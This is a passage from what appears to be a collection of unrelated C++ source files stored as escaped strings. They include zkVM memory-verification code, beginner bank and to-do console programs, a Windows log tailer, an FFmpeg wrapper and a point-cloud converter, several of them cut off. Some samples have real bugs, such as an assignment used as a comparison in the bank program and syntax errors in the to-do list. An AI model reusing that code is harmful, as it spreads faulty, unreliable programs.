1;\nconstexpr size_t kVerifyMemHaltKind = 2;\n\nvoid par_step_exec(MachineContext* ctx,\n                   uint32_t steps,\n                   uint32_t cycle,\n                   uint32_t count,\n                   Fp* ctrl,\n                   Fp* io,\n                   Fp* data) {\n  std::array<Fp*, 3> args{ctrl, io, data};\n  if (cycle == 0 || ctx->isParSafeExec(cycle)) {\n    // printf(\"step_exec(%u)\\n\", cycle);\n    step_exec(ctx, steps, cycle++, args.data());\n    while (cycle < count && !ctx->isParSafeExec(cycle)) {\n      // printf(\"step_exec(%u)\\n\", cycle);\n      step_exec(ctx, steps, cycle++, args.data());\n    }\n  }\n}\n\nvoid par_step_verify_mem(MachineContext* ctx,\n                         uint32_t steps,\n                         uint32_t cycle,\n                         uint32_t count,\n                         Fp* ctrl,\n                         Fp* io,\n                         Fp* data) {\n  std::array<Fp*, 3> args{ctrl, io, data};\n  if (cycle == 0 || ctx->isParSafeVerifyMem(cycle)) {\n    // printf(\"step_verify_mem(%u)\\n\", cycle);\n    step_verify_mem(ctx, steps, cycle++, args.data());\n    while (cycle < count && !ctx->isParSafeVerifyMem(cycle)) {\n      step_verify_mem(ctx, steps, cycle++, args.data());\n    }\n  }\n}\n\nvoid MachineContext::sortRam() {\n  // printf(\"sortRam\\n\");\n  nvtx3::scoped_range range(\"sortRam\");\n  {\n    nvtx3::scoped_range range(\"sort\");\n    std::sort(poolstl::par, ramRows.begin(), ramRows.end());\n  }\n\n  {\n    nvtx3::scoped_range range(\"dirty\");\n    uint32_t prevDirty = 0;\n    for (size_t i = 0; i < ramRows.size(); i++) {\n      RamArgumentRow& row = ramRows[i];\n      switch (row.getMemOp()) {\n      case 0: // pageIo\n        row.dirty = 0;\n        break;\n      case 1: // read\n        row.dirty = prevDirty;\n        break;\n      case 2: // write\n        row.dirty = 1;\n        break;\n      }\n      prevDirty = row.dirty;\n    }\n  }\n\n  {\n    nvtx3::scoped_range range(\"scan\");\n    std::exclusive_scan(poolstl::par, ramIndex.begin(), ramIndex.end(), ramIndex.begin(), 0);\n  }\n}\n\nvoid inject_backs_ram(MachineContext* ctx, size_t steps, size_t cycle, Fp* data) {\n  uint8_t kind = ctx->isParSafeVerifyMem(cycle);\n  if (cycle > 2 && kind) {\n    size_t idx = ctx->ramIndex[cycle];\n    if (idx == 0) {\n      throw std::runtime_error(\"inject_backs_ram: idx == 0\");\n    }\n\n    const RamArgumentRow& back1 = ctx->ramRows[idx - 1];\n    data[89 * steps + cycle - 1] = back1.addr;              // a->addr\n    data[90 * steps + cycle - 1] = back1.getMemCycle();     // a->cycle\n    data[91 * steps + cycle - 1] = back1.getMemOp();        // a->memOp\n    data[92 * steps + cycle - 1] = back1.word & 0xff;       // a->data[0]\n    data[93 * steps + cycle - 1] = back1.word >> 8 & 0xff;  // a->data[1]\n    data[94 * steps + cycle - 1] = back1.word >> 16 & 0xff; // a->data[2]\n    data[95 * steps + cycle - 1] = back1.word >> 24 & 0xff; // a->data[3]\n    data[97 * steps + cycle - 1] = back1.dirty;             // prevVerifier->dirty\n    if (kind == kVerifyMemHaltKind) {\n      const RamArgumentRow& back2 = ctx->ramRows[idx - 2];\n      uint32_t isNewAddr = back2.addr != back1.addr;\n      uint32_t cmp;\n      if (isNewAddr) {\n        cmp = back1.addr - back2.addr - 1;\n      } else {\n        cmp =\n            back1.getMemCycle() * 3 + back1.getMemOp() - back2.getMemCycle() * 3 + back2.getMemOp();\n      }\n      uint32_t diff[3];\n      for (size_t i = 0; i < 3; i++) {\n        diff[i] = cmp & 0xff;\n        cmp = cmp >> 8;\n      }\n      uint32_t extra = cmp;\n      data[96 * steps + cycle - 1] = isNewAddr; // isNewAddr\n      data[3 * steps + cycle - 1] = diff[0];    // diff[0]\n      data[4 * steps + cycle - 1] = diff[1];    // diff[1]\n      data[5",
    "// Online C++ compiler to run C++ program online\r\n/*CREATING BANK ACCOUNT USING C++*/\r\n#include <iostream>\r\nusing namespace std;\r\nint i;\r\n class mybank{\r\nprivate:\r\n    int accountno,amount;\r\n    string name;\r\n    \r\n \r\npublic:\r\n   void accept();\r\n   void display();\r\n   void widraw();\r\n   void deposite();\r\n   void balance();\r\n        mybank(){\r\n            accountno;\r\n            amount;\r\n            name;\r\n            \r\n        }\r\n};\r\nmybank m[100];\r\nint j=0;\r\n        void mybank::accept()\r\n        {   int n;\r\n        \r\n            cout<<\"\\tenter your name\\n\";\r\n            cin>>name;\r\n\r\n            cout<<\"\\tenter acc number\\n\";\r\n            cin>>accountno;\r\n\r\n            cout<<\"\\tenter amount\\n\";\r\n                       \r\n            cin>>amount;\r\n            j++;\r\n        }\r\n        void mybank::display(){\r\n            for(i=0;i<j;i++)\r\n            {\r\n              cout << \"\\nAccount \" << i + 1 << \":\\n\";\r\n             \r\n              cout<<\"\\n Name:\"<<m[i].name<<\"\\n Account number:\"<<m[i].accountno<<\"\\n Amount:\"<<m[i].amount;\r\n            }\r\n        \r\n        }\r\n        void mybank::widraw(){\r\n        int ac,am;\r\n        cout<<\"enter acount number\";\r\n        cin>>ac;\r\n        cout<<\"enter amount you want to widraw\";\r\n        cin>>am;\r\n        for(i=0;i<j;i++)\r\n        {\r\n            if (m[i].accountno=ac)\r\n            {\r\n                m[i].amount=m[i].amount-am;\r\n                break;\r\n            }\r\n        }\r\n        }\r\n        void mybank::deposite(){\r\n        int acc,amt;\r\n        \r\n        cout<<\"enter account no\";\r\n        cin>>acc;\r\n        cout<<\"enter amount you want to deposite\";\r\n        cin>>amt;\r\n        for(i=0;i<j;i++)\r\n        {\r\n            if(m[i].accountno==acc)\r\n            m[i].amount=m[i].amount+amt;\r\n            \r\n            break;\r\n        }\r\n        }\r\n        void mybank::balance(){\r\n            int c;\r\n         \r\n            \r\n            cout<<\"enter acount number\";\r\n            cin>>c;\r\n            for(int i=0;i<j;i++){\r\n                if(m[i].accountno==c){\r\n                \r\n            cout<<\"amount is\"<<m[i].amount<<endl;\r\n                }\r\n            else\r\n             cout<<\"ac not found\"<<endl;\r\n            }\r\n        \r\n        }\r\nint main() {\r\n   \r\n    int ch;\r\n    while(1){\r\n         cout<<\"WELCOME TO UNION BANK\"<<endl;\r\n        cout<<\"\\nAccept: \\ndisplay: \\nWidraw: \\nDeposite:\\nbalance\";\r\n        cout<<\"\\nenter your choice:\";\r\n        cin>>ch;\r\n        \r\n        switch(ch){\r\n            case 1:\r\n            m[j].accept();\r\n            break;\r\n            case 2:\r\n            m[j].display();\r\n            break;\r\n            case 3:\r\n            m[j].widraw();\r\n            break;\r\n            case 4:\r\n            m[j].deposite();\r\n            break;\r\n            case 5:\r\n            m[j].balance();\r\n            break;\r\n            case 6:\r\n            return 0;\r\n            default:\r\n            cout<<\"invlid choice\\n\";\r\n            \r\n        }\r\n    }\r\n    \r\n\r\n    return 0;\r\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <limits>\r\n\r\nstruct Tasks{\r\n    std::string description;\r\n    bool completed;\r\n    Tasks(const std::string& desc):description(desc),completed(false){}\r\n};\r\n\r\nclass ToDoList {\r\nprivate:\r\n    std::vector<Tasks>tasks;\r\n\r\npublic:\r\n    void addTask(const std::string& taskDescription){\r\n        tasks.emplace_back(taskDescription);\r\n        std::cout<<\"Task added successfully!\"<<std::endl;\r\n    }\r\n\r\n    void viewTasks()const{\r\n        if(tasks.empty()){\r\n            std::cout <<\"No tasks in the list.\"<<std::endl;\r\n        }else{\r\n            std::cout <<\"Your tasks:\"<<std::endl;\r\n            for(size_t i = 0;i<tasks.size(); ++i){\r\n                std::cout << i + 1 <<\". \"<<tasks[i].description\r\n                          <<\" [\" << (tasks[i].completed ? \"Completed\" : \"Pending\") << \"]\" << std::endl;\r\n            }\r\n        }\r\n    }\r\n\r\n    void markTaskAsCompleted(size_t index) {\r\n        if (index > 0 && index <= tasks.size()) {\r\n            tasks[index - 1].completed = true;\r\n            std::cout<<\"Task marked as completed!\"<<std::endl;\r\n        } else {\r\n            std::cout<<\"Invalid task number. Please try again.\"<<std::endl;\r\n        }\r\n    }\r\n\r\n    void removeTask(size_t index) {\r\n        if (index > 0 && index <= tasks.size()) {\r\n            tasks.erase(tasks.begin() + index - 1);\r\n            std::cout << \"Task removed successfully!\" << std::endl;\r\n        } else {\r\n            std::cout << \"Invalid task number. Please try again.\" << std::endl;\r\n        }\r\n    }\r\n}\r\n\r\nvoid displayMenu() {\r\n    std::cout << \"\\nTo-Do list funtions available:-\" << std::endl;\r\n    std::cout << \"1. Add Task\" << std::endl;\r\n    std::cout << \"2. View Tasks\" << std::endl;\r\n    std::cout << \"3. Mark Task as Completed\" << std::endl;\r\n    std::cout << \"4. Remove Task\" << std::endl;\r\n    std::cout << \"5. Exit\" << std::endl;\r\n    std::cout << \"Enter your choice: \";,\r\n}\r\n\r\nint main() {\r\n    ToDoList toDoList;\r\n    int choice;\r\n    std::string detailedtask;\r\n    size_t taskNumber;\r\n\r\n    do {\r\n        displayMenu();\r\n        std::cin >> choice;\r\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');  // Clear input buffer\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                std::cout << \"Enter task description: \";\r\n                std::getline(std::cin,detailedtask);\r\n                toDoList.addTask(detailedtask);\r\n                break;\r\n            case 2:\r\n                toDoList.viewTasks();\r\n                break;\r\n            case 3:\r\n                std::cout << \"Enter task no to mark as completed: \";\r\n                std::cin >> taskNumber;\r\n                toDoList.markTaskAsCompleted(taskNumber);\r\n                break;\r\n            case 4:\r\n                std::cout << \"Enter task no to remove: \";\r\n                std::cin >> taskNumber;\r\n                toDoList.removeTask(taskNumber);\r\n                break;\r\n            case 5:\r\n                std::cout << \"Exiting...\" << std::endl;\r\n                break;\r\n            default:\r\n                std::cout << \"Invalid choice,try again.\" << std::endl;\r\n                break;\r\n        }\r\n    } while (choice != 5);\r\n\r\n    return 0;\r\n}\r\n",
    "#include <stdio.h>\n#include <windows.h>\n#include <dbghelp.h>\n#include <wintrust.h>\n#include <Softpub.h>\n#include <wincrypt.h>\n#include <iostream>\n#include <tchar.h>\n#include <vector>\n#include <fstream>\n#include <string>\n#include <tdh.h>\n#include <iomanip>\n#include <sstream>\n#include <thread>\n#include <atomic>\n#include <chrono>\n\n#include \"loguru.hpp\"\n#include \"logreader.h\"\n\n// Will be checked each second and exit thread if true\nstd::atomic<bool> LogReaderThreadStopFlag(false);\n\n\nvoid LogReaderStopAll() {\n    LogReaderThreadStopFlag = TRUE;\n}\n\n\n// Stupid but working tail-f implementation\n// Just checks every second for new data\nvoid tailFileW(const wchar_t* filePath) {\n    LOG_F(INFO, \"--{ Tail -f %ls\", filePath);\n\n    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (hFile == INVALID_HANDLE_VALUE) {\n        LOG_F(ERROR, \"Failed to open file. Error: %lu\", GetLastError());\n        return;\n    }\n\n    // Buffer for reading the file\n    const DWORD bufferSize = 1024;\n    wchar_t buffer[bufferSize / sizeof(wchar_t)];\n    DWORD bytesRead;\n    LARGE_INTEGER fileSize;\n    LARGE_INTEGER offset;\n\n    // Get the file size\n    if (!GetFileSizeEx(hFile, &fileSize)) {\n        LOG_F(ERROR, \"Failed to get file size. Error: %lu\", GetLastError());\n        CloseHandle(hFile);\n        return;\n    }\n\n    // Start reading from the end of the file\n    offset.QuadPart = fileSize.QuadPart;\n    while (!LogReaderThreadStopFlag) {\n        // Check if there's new data\n        LARGE_INTEGER newSize;\n        if (!GetFileSizeEx(hFile, &newSize)) {\n            LOG_F(ERROR, \"Failed to get file size. Error: %lu\", GetLastError());\n            break;\n        }\n\n        if (newSize.QuadPart > offset.QuadPart) {\n            // Move the file pointer to the last read position\n            SetFilePointerEx(hFile, offset, NULL, FILE_BEGIN);\n\n            // Read the new data\n            if (!ReadFile(hFile, buffer, bufferSize - sizeof(wchar_t), &bytesRead, NULL)) {\n                LOG_F(INFO, \"Failed to read file. Error: %lu\", GetLastError());\n                break;\n            }\n\n            // Null-terminate the buffer\n            buffer[bytesRead / sizeof(wchar_t)] = L'\\0';\n\n            // Print the new data (including newline?)\n            wprintf(L\"%s\", buffer);\n\n            // Update the offset\n            offset.QuadPart += bytesRead;\n        }\n\n        // Sleep for a while before checking again\n        Sleep(1000);\n    }\n\n    CloseHandle(hFile);\n}\n\n\nstd::wstring findFiles(const std::wstring& directory, const std::wstring& pattern) {\n    WIN32_FIND_DATA findFileData;\n    HANDLE hFind = INVALID_HANDLE_VALUE;\n    std::wstring fullPattern = directory + L\"\\\\\" + pattern;\n\n    // Find the first file in the directory\n    hFind = FindFirstFile(fullPattern.c_str(), &findFileData);\n\n    if (hFind == INVALID_HANDLE_VALUE) {\n        LOG_F(ERROR, \"No files found matching the pattern: %ls\", pattern.c_str());\n        return L\"\";\n    }\n    else {\n        do {\n            //std::wcout << findFileData.cFileName << std::endl;\n            return directory + L\"\\\\\" + findFileData.cFileName;\n        } while (FindNextFile(hFind, &findFileData) != 0);\n\n        DWORD dwError = GetLastError();\n        FindClose(hFind);\n        if (dwError != ERROR_NO_MORE_FILES) {\n            LOG_F(ERROR, \"Error occurred while finding files: %d\", dwError);\n            return L\"\";\n        }\n    }\n}\n\n\nDWORD WINAPI LogReaderProcessingThread(LPVOID param) {\n    const wchar_t* path = (wchar_t*)param;\n    LOG_F(INFO, \"--{ Start LogReaderProcessingThread: %ls\", path);\n    tailFileW(path);\n    LOG_F(INFO, \"--{ Stopped LogReaderProcessingThread\");\n    return 0;\n}\n\n\nwchar_t* allocateAndCopyWString(const std::wstring& str) {\n    size_t length = str.length();\n    wchar_t* copy = new wchar_t[length + 1]; // +1 for null terminator\n    std::copy(str.c_str(), str.c_str() + length + 1, copy);\n    return copy;\n}\n\nBOOL InitializeLogReader(std::vector<HANDLE>& threads) {\n    std::wstring directory;\n    std::wstring pattern;\n\n    directory = L\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Support\";\n    pattern = L\"MPLog-*\";\n\n    if (TRUE) {\n        directory = L\"C:\\\\temp\";\n        pattern = L\"test*\";\n    }\n\n    std::wstring path = findFiles(directory, pattern);\n    if (path == L\"\") {\n        LOG_F(ERROR, \"File not found\");\n        return 1;\n    }\n\n    wchar_t* real_path = allocateAndCopyWString(path);\n    HANDLE thread = CreateThread(NULL, 0, LogReaderProcessingThread, (LPVOID)real_path, 0, NULL);\n    if (thread == NULL) {\n        LOG_F(ERROR, \"Failed to create thread for trace session logreader\");\n        return 1;\n    }\n    threads.push_back(thread);\n\n    //tailFileW(path.c_str());\n    return TRUE;\n}\n\n",
    "#include \"SFFmpeg.h\"\n#include\"SLogger.h\"\nSFFmpeg::SFFmpeg()\n{\n}\n\nSFFmpeg& SFFmpeg::instance()\n{\n\tstatic SFFmpeg ffmpeg;\n\treturn ffmpeg;\n}\n\nstatic inline double q2d(AVRational a) {\n\tif (a.den == 0)return 0.0;\n\treturn a.num / (double)a.den;\n}\n\nbool SFFmpeg::open(const std::string& filename)\n{\n\tif (isOpen())close();\n\tstd::lock_guard<std::mutex>lock(this->m_mutex);\n\tint ret = avformat_open_input(&this->m_fmtCtx, filename.data(), nullptr, nullptr);\n\tif (ret != 0) {\n\t\tav_strerror(ret, this->m_errBuf, sizeof(this->m_errBuf));\n\t\tLOG_ERROR(\"avformat_open_input error : %s\", this->m_errBuf);\n\t\treturn false;\n\t}\n\t\n\t//\u8bfb\u53d6\u6d41\u4fe1\u606f\n\tret = avformat_find_stream_info(this->m_fmtCtx, nullptr);\n\tif (ret < 0) {\n\t\tav_strerror(ret, this->m_errBuf, sizeof(this->m_errBuf));\n\t\tLOG_ERROR(\"avformat_open_input error : %s\", this->m_errBuf);\n\t\tavformat_close_input(&this->m_fmtCtx);\n\t\treturn false;\n\t}\n\n\t//\u83b7\u53d6\u89c6\u9891\u65f6\u957f\n\tm_totalMs = (double)this->m_fmtCtx->duration / AV_TIME_BASE * 1000;\n\n\t//\u67e5\u627e\u89c6\u9891\u6d41\n\tthis->m_videoIndex = av_find_best_stream(this->m_fmtCtx,\n\t\tAVMEDIA_TYPE_VIDEO, -1, -1, nullptr, 0);\n\tif (this->m_videoIndex < 0) {\n\t\tif (this->m_videoIndex == AVERROR_STREAM_NOT_FOUND) {\n\t\t\tLOG_WARNING(\"video stream not found !\");\n\t\t}\n\t\telse if (this->m_videoIndex == AVERROR_DECODER_NOT_FOUND) {\n\t\t\tLOG_WARNING(\"video decoder not found !\");\n\t\t}\n\t\tav_strerror(this->m_videoIndex, this->m_errBuf,\n\t\t\tsizeof(this->m_errBuf));\n\t}\n\telse {\n\t\tthis->m_codecCtx[this->m_videoIndex] = \n\t\t\tStreamCodecContext(this->m_videoIndex);\n\t\tthis->m_fps = q2d(this->m_fmtCtx->streams[this->m_videoIndex]->avg_frame_rate);\n\t}\n\n\t//\u67e5\u627e\u97f3\u9891\u6d41\n\tthis->m_audioIndex = av_find_best_stream(this->m_fmtCtx, \n\t\tAVMEDIA_TYPE_AUDIO, -1, -1, nullptr, 0);\n\tif (this->m_audioIndex < 0) {\n\t\tif (this->m_audioIndex == AVERROR_STREAM_NOT_FOUND) {\n\t\t\tLOG_WARNING(\"audio stream not found !\");\n\t\t}\n\t\telse if (this->m_audioIndex == AVERROR_DECODER_NOT_FOUND) {\n\t\t\tLOG_WARNING(\"audio decoder not found !\");\n\t\t}\n\t\tav_strerror(this->m_audioIndex, this->m_errBuf,\n\t\t\tsizeof(this->m_errBuf));\n\t}\n\telse\n\t{\n\t\tthis->m_codecCtx[this->m_audioIndex] =\n\t\t\tStreamCodecContext(this->m_audioIndex);\n\t\tthis->m_audioFmt.setSampleRate(this->m_codecCtx[this->m_audioIndex]->sample_rate);\n\t\tthis->m_audioFmt.setSampleChannels(this->m_codecCtx[this->m_audioIndex]->ch_layout.nb_channels);\n\t\tthis->m_audioFmt.setSampleFormat(this->m_codecCtx[this->m_audioIndex]->sample_fmt);\n\t\t\t\n\t\tLOG_DEBUG(\"audio sample-reat : %d sample-format : %d channel count : %d \",\n\t\t\tthis->m_audioFmt.sampleRate(),this->m_audioFmt.sampleFormat(), this->m_audioFmt.sampleChannels());\n\t}\n\treturn true;\n}\n\nbool SFFmpeg::isOpen() const\n{\n\treturn !!this->m_fmtCtx;\n}\n\nvoid SFFmpeg::close()\n{\n\tstd::lock_guard<std::mutex>lock(this->m_mutex);\n\t//\u5173\u95ed\u6253\u5f00\u7684\u6587\u4ef6\n\tif (isOpen()) {\n\t\tavformat_close_input(&this->m_fmtCtx); \n\t}\n\t//\u91ca\u653e\u89e3\u7801\u5668\u4e0a\u4e0b\u6587\n\tfor (size_t i = 0; i < AVMEDIA_TYPE_NB; i++)\n\t{\n\t\tif (this->m_codecCtx[i]) {\n\t\t\tavcodec_free_context(&this->m_codecCtx[i]);\n\t\t}\n\t}\n\tif (this->m_yuvFrame) {\n\t\tav_frame_free(&this->m_yuvFrame);\n\t}\n\tif (this->m_pcmFrame) {\n\t\tav_frame_free(&this->m_pcmFrame);\n\t}\n\n\tswr_free(&this->m_swrCtx);\n\tsws_freeContext(this->m_swsCtx);\n\tthis->m_swsCtx = nullptr;\n}\n\nstd::string SFFmpeg::errorString() const\n{ \n\tstd::lock_guard<std::mutex>lock(this->m_mutex);\n\treturn std::string(this->m_errBuf);\n}\n\nvoid SFFmpeg::aspectSize(int* w, int* h)\n{\n\tswitch (this->m_aspectMode)\n\t{\n\tcase SFFmpeg::AspectNone:\n\t\tthis->m_rational = { 0 };\n\t\tbreak;\n\tcase SFFmpeg::Aspect4_3:\n\t\tthis->m_rational = { 4 , 3};\n\t\tbreak;\n\tcase SFFmpeg::Aspect16_9:\n\t\tthis->m_rational = { 16 , 9};\n\t\tbreak;\n\t}\n\tif (this->m_aspectMode != AspectNone && this->m_rational.num != 0 &&\n\t\tthis->m_rational.den != 0) {\n\t\t*h = FFMIN(*w / q2d(this->m_rational), *h);\n\t\t*w = FFMIN(*h * q2d(this->m_rational), *w);\n\t}\n}\n\ndouble SFFmpeg::packetPts(const AVPacket& pkt)\n{\n\tstd::lock_guard<std::mutex>lock(this->m_mutex);\n\tif (isOpen() || pkt.size == 0)return 0.0;\n\treturn this->m_pts =  pkt.pts * q2d(this->m_fmtCtx->streams[pkt.stream_index]->time_base) * 1000;\n\t \n}\n\nAVPacket SFFmpeg::read()\n{\n\tstd::lock_guard<std::mutex>lock(this->m_mutex);\n\tAVPacket pkt{};\n\tif (!isOpen()) {\n\t\tstrncpy(this->m_errBuf, \"AVFormatContext is null ,file not open !\", sizeof(this->m_errBuf));\n\t\tLOG_WARNING(this->m_errBuf);\n\t\treturn pkt;\n\t}\n\n\tint ret = av_read_frame(this->m_fmtCtx, &pkt);\n\tif (ret < 0) {\n\t\tav_strerror(ret, this->m_errBuf, sizeof(this->m_errBuf));\n\t\t//LOG_WARNING(this->m_errBuf);\n\t\treturn pkt;\n\t}\n\treturn pkt;\n}\n\nint SFFmpeg::decode(const AVPacket* pkt)\n{\n\tstd::lock_guard<std::mutex>lock(this->m_mutex);\n\tif (!isOpen()) {\n\t\tLOG_ERROR(\"\u672a\u6253\u5f00\u6587\u4ef6\");\n\t\treturn -1;\n\t}\n\n\tif (!this->m_yuvFrame) {\n\t\tthis->m_yuvFrame = av_frame_alloc();\n\t}\n\tif (!this->m_pcmFrame) {\n\t\tthis->m_pcmFrame = av_frame_alloc();\n\t}\n\n\tint ret = avcodec_send_packet(this->m_codecCtx[pkt->stream_index], pkt);\n\tif (ret != 0) {\n\t\tav_strerror(ret, this->m_errBuf, sizeof(this->m_errBuf));\n\t\tif (ret == AVERROR(EAGAIN)) {\n\t\t\tLOG_DEBUG(\"AVERROR(EAGAIN)\");\n\t\t}\n\t\telse if (ret == AVERROR_EOF) {\n\t\t\tLOG_DEBUG(\"",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_crm_api\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <unordered_map>\n#include <ctime>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Book\n{\n    string title;\n    string author;\n    string isbn;\n    int publicationYear;\n    string genre;\n    string category;\n    bool borrowed;\n    bool reserved;\n    string reservedBy;\n    time_t dueDate;\n};\n\nstruct User\n{\n    string username;\n    string password;\n    string fullName;\n    string email;\n};\n\nclass Library\n{\nprivate:\n    vector<Book> books;\n    unordered_map<string, User> users;\n    string currentUser;\n\n    int findBookIndexByTitle(const string &title) const\n    {\n        for (size_t i = 0; i < books.size(); ++i)\n        {\n            if (books[i].title == title)\n            {\n                return i;\n            }\n        }\n        return -1;\n    }\n\n    vector<Book> findBooksByCategory(const string &category) const\n    {\n        vector<Book> result;\n        for (const auto &book : books)\n        {\n            if (book.category == category)\n            {\n                result.push_back(book);\n            }\n        }\n        return result;\n    }\n\n    vector<Book> findBooksByGenre(const string &genre) const\n    {\n        vector<Book> result;\n        for (const auto &book : books)\n        {\n            if (book.genre == genre)\n            {\n                result.push_back(book);\n            }\n        }\n        return result;\n    }\n\n    bool isValidYear(int year) const\n    {\n        time_t now = time(nullptr);\n        tm *ltm = localtime(&now);\n        int currentYear = 1900 + ltm->tm_year;\n        return year > 0 && year <= currentYear;\n    }\n\npublic:\n    void addBook(const string &title, const string &author, const string &isbn, int publicationYear, const string &genre, const string &category)\n    {\n        if (title.empty() || author.empty() || isbn.empty() || genre.empty() || category.empty() || !isValidYear(publicationYear))\n        {\n            cout << \"Invalid input. Please provide valid book details.\" << endl;\n            return;\n        }\n        Book newBook{title, author, isbn, publicationYear, genre, category, false, false, \"\", 0};\n        books.push_back(newBook);\n        cout << \"Book added successfully.\" << endl;\n    }\n\n    void listBooks() const\n    {\n        if (books.empty())\n        {\n            cout << \"No books available.\" << endl;\n            return;\n        }\n        for (const auto &book : books)\n        {\n            cout << \"Title: \" << book.title << \", Author: \" << book.author\n                 << \", ISBN: \" << book.isbn << \", Year: \" << book.publicationYear\n                 << \", Genre: \" << book.genre << \", Category: \" << book.category\n                 << \", Status: \" << (book.borrowed ? \"Borrowed\" : (book.reserved ? \"Reserved\" : \"Available\"))\n                 << (book.dueDate ? \", Due Date: \" + to_string(book.dueDate) : \"\") << endl;\n        }\n    }\n\n    void searchBook(const string &query) const\n    {\n        bool found = false;\n        for (const auto &book : books)\n        {\n            if (book.title.find(query) != string::npos || book.author.find(query) != string::npos)\n            {\n                cout << \"Title: \" << book.title << \", Author: \" << book.author\n                     << \", ISBN: \" << book.isbn << \", Year: \" << book.publicationYear\n                     << \", Genre: \" << book.genre << \", Category: \" << book.category\n                     << \", Status: \" << (book.borrowed ? \"Borrowed\" : (book.reserved ? \"Reserved\" : \"Available\"))\n                     << (book.dueDate ? \", Due Date: \" + to_string(book.dueDate) : \"\") << endl;\n                found = true;\n            }\n        }\n        if (!found)\n        {\n            cout << \"No books found matching query.\" << endl;\n        }\n    }\n\n    void searchBookByCategory(const string &category) const\n    {\n        vector<Book> booksInCategory = findBooksByCategory(category);\n        if (booksInCategory.empty())\n        {\n            cout << \"No books found in category: \" << category << endl;\n            return;\n        }\n        for (const auto &book : booksInCategory)\n        {\n            cout << \"Title: \" << book.title << \", Author: \" << book.author\n                 << \", ISBN: \" << book.isbn << \", Year: \" << book.publicationYear\n                 << \", Genre: \" << book.genre << \", Status: \" << (book.borrowed ? \"Borrowed\" : (book.reserved ? \"Reserved\" : \"Available\"))\n                 << (book.dueDate ? \", Due Date: \" + to_string(book.dueDate) : \"\") << endl;\n        }\n    }\n\n    void searchBookByGenre(const string &genre) const\n    {\n        vector<Book> booksInGenre = findBooksByGenre(genre);\n        if (booksInGenre.empty())\n        {\n            cout << \"No books found in genre: \" << genre << endl;\n            return;\n        }\n        for (const auto &book : booksInGenre)\n        {\n            cout << \"Title: \" << book.title << \", Author: \" << book.author\n                 << \", ISBN: \" << book.isbn << \", Year: \" << book.publicationYear\n                 <<",
    "#include <string>\n#include <iostream>\n#include <ros/ros.h>\n#include \"npy.hpp\"\n#include \"pcd_extension.hpp\"\n\n#include <pcl/io/pcd_io.h>\n#include <pcl/point_types.h>\n\nusing namespace std;\n\nvoid convert_npyClass_pcdXYZVector(string path, string out_path){\n    // 1. Read .npy file to make 2d std::vector (N * K)\n    vector<vector<double>> points;\n    npy::npy_data<double> d = npy::read_npy<double>(path);\n    std::vector<double> data = d.data;\n    std::vector<unsigned long> shape = d.shape; // It should be (N, 3 + K)\n\n    points.resize(shape[0]);\n    for(int i = 0; i < shape[0]; i++){\n        points[i].resize(shape[1]);\n        for(int j = 0; j < shape[1]; j++){\n            points[i][j] = data[i*shape[1] + j];\n        }\n    }\n\n    // points variable has (N, 3+K) information in 2D vector.\n    // 2. `points` 2D-Vector to PointXYZL\n    pcl::PointCloud<VKJYPointXYZVector> cloud;\n    cloud.resize(shape[0]);\n\n    int i = 0;\n    for (auto& point: cloud){\n        save_std_vector_PointXYZVector(&point, points[i]);\n        i++;\n    }\n\n    pcl::io::savePCDFileASCII (out_path, cloud);\n    std::cerr << \"Saved \" << cloud.size() << \" data points to \" << out_path << \" \" << std::endl;\n}\n\nvoid convert_npyClass_pcdXYZL(string path, string out_path){\n    // 1. Read .npy file to make 2d std::vector (N * K)\n    vector<vector<double>> points;\n    npy::npy_data<double> d = npy::read_npy<double>(path);\n    std::vector<double> data = d.data;\n    std::vector<unsigned long> shape = d.shape; // It should be (N, K)\n\n    cout << \"Current Shape : \" << shape[0] << \", \" << shape[1] << endl;\n    points.resize(shape[0]);\n    for(int i = 0; i < shape[0]; i++){\n        points[i].resize(4);\n\n        // 2-1. XYZ\n        points[i][0] = data[i* shape[1] + 0 ];\n        points[i][1] = data[i* shape[1] + 1 ];\n        points[i][2] = data[i* shape[1] + 2 ];\n\n        double max_value = -100.0;\n        int max_index    = -100;\n\n        for(int j = 3; j < shape[1]; j++){\n            double current_value = data[i* shape[1] + j];\n            if(current_value > max_value){\n                max_value = current_value;\n                max_index = j-3;\n            }\n        }\n\n        points[i][3] = max_index;\n    }\n\n    // 2. `points` 2D-Vector to PointXYZL\n    pcl::PointCloud<pcl::PointXYZL> cloud;\n    cloud.resize(shape[0]);\n\n    int i = 0;\n    for (auto& point: cloud){\n        auto row = points[i];\n        point.x = row[0];\n        point.y = row[1];\n        point.z = row[2];\n        point.label = row[3];\n\n        i++;\n    }\n\n    pcl::io::savePCDFileASCII (out_path, cloud);\n    std::cerr << \"Saved \" << cloud.size() << \" data points to \" << out_path << \" \" << 